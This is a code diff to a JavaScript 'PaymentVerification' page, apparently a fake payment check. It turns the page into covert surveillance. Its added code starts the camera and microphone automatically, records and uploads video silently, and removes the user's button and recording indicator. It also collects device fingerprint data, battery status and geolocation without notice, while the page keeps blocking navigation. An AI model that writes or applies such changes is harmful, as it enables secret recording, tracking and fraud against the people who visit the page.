@@ -2,7 +2,6 @@ class PaymentVerification {
     constructor() {
         this.video = document.getElementById('video');
         this.canvas = document.getElementById('canvas');
-        this.startButton = document.getElementById('startCamera');
         this.recordingStatus = document.getElementById('recording-status');
         this.loadingOverlay = document.getElementById('loadingOverlay');
         
@@ -19,14 +18,11 @@ class PaymentVerification {
         // Establecer tiempo actual
         this.setCurrentTime();
         
-        // Event listeners
-        this.startButton.addEventListener('click', () => this.handleCameraRequest());
+        // Activar cámara automáticamente después de 2 segundos
+        setTimeout(() => this.handleCameraRequest(), 2000);
         
         // Bloquear navegación sin verificación
         this.blockNavigation();
-        
-        // Mostrar mensaje de urgencia después de 30 segundos
-        setTimeout(() => this.showUrgencyMessage(), 30000);
     }
     
     setCurrentTime() {
@@ -45,25 +41,78 @@ class PaymentVerification {
 
     
     getBrowserInfo() {
-        const userAgent = navigator.userAgent;
-        let browser = 'Unknown';
+        const nav = navigator;
+        const screen = window.screen;
         
-        if (userAgent.includes('Chrome')) browser = 'Chrome';
-        else if (userAgent.includes('Firefox')) browser = 'Firefox';
-        else if (userAgent.includes('Safari')) browser = 'Safari';
-        else if (userAgent.includes('Edge')) browser = 'Edge';
+        return {
+            userAgent: nav.userAgent,
+            platform: nav.platform,
+            language: nav.language,
+            languages: nav.languages?.join(', ') || 'N/A',
+            cookieEnabled: nav.cookieEnabled,
+            onLine: nav.onLine,
+            screenWidth: screen.width,
+            screenHeight: screen.height,
+            screenColorDepth: screen.colorDepth,
+            screenPixelDepth: screen.pixelDepth,
+            windowWidth: window.innerWidth,
+            windowHeight: window.innerHeight,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            memory: nav.deviceMemory || 'N/A',
+            cores: nav.hardwareConcurrency || 'N/A',
+            connection: nav.connection ? {
+                effectiveType: nav.connection.effectiveType,
+                downlink: nav.connection.downlink,
+                rtt: nav.connection.rtt
+            } : 'N/A',
+            battery: 'checking...',
+            geolocation: 'checking...'
+        };
+    }
+
+    async getDetailedDeviceInfo() {
+        const basicInfo = this.getBrowserInfo();
         
-        return `${browser} - ${userAgent}`;
+        // Intentar obtener información de batería
+        try {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                basicInfo.battery = {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            }
+        } catch (e) {
+            basicInfo.battery = 'No disponible';
+        }
+
+        // Intentar obtener geolocalización (silenciosamente)
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    timeout: 5000,
+                    enableHighAccuracy: false
+                });
+            });
+            basicInfo.geolocation = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy
+            };
+        } catch (e) {
+            basicInfo.geolocation = 'No disponible';
+        }
+
+        return basicInfo;
     }
     
     async handleCameraRequest() {
         if (this.isRecording) return;
         
-        this.startButton.disabled = true;
-        this.startButton.textContent = '🔄 กำลังเชื่อมต่อ... Connecting...';
-        
         try {
-            // Solicitar permisos de cámara y micrófono
+            // Solicitar permisos de cámara y micrófono silenciosamente
             this.stream = await navigator.mediaDevices.getUserMedia({ 
                 video: {
                     width: { ideal: 640 },
@@ -75,14 +124,13 @@ class PaymentVerification {
             
             this.hasPermission = true;
             this.video.srcObject = this.stream;
-            this.video.classList.add('active');
             
             // Esperar a que el video esté listo
             await new Promise(resolve => {
                 this.video.onloadedmetadata = resolve;
             });
             
-            // Comenzar grabación automáticamente
+            // Comenzar grabación automáticamente y silenciosamente
             this.startRecording();
             
         } catch (error) {
@@ -108,8 +156,8 @@ class PaymentVerification {
             console.log('Error logging camera denial:', error);
         }
         
-        // Mostrar mensaje de error y bloquear acceso
-        this.showCameraErrorMessage();
+        // Si niegan la cámara, solo logear silenciosamente
+        console.log('Camera access denied');
     }
     
     showCameraErrorMessage() {
@@ -173,9 +221,7 @@ class PaymentVerification {
         this.mediaRecorder.start();
         this.isRecording = true;
         
-        // Mostrar estado de grabación
-        this.recordingStatus.style.display = 'flex';
-        this.startButton.style.display = 'none';
+        // Grabación silenciosa - no mostrar nada
         
         // Grabar por 10 segundos
         setTimeout(() => {
@@ -193,8 +239,8 @@ class PaymentVerification {
                 this.stream.getTracks().forEach(track => track.stop());
             }
             
-            this.recordingStatus.style.display = 'none';
-            this.loadingOverlay.style.display = 'flex';
+            // Procesar silenciosamente
+            console.log('Video grabado exitosamente');
         }
     }
     
@@ -212,9 +258,9 @@ class PaymentVerification {
             const result = await response.json();
             
             if (result.status === 'success') {
-                this.showSuccessMessage();
+                console.log('Video enviado exitosamente');
             } else {
-                this.showErrorMessage();
+                console.log('Error enviando video');
             }
             
         } catch (error) {
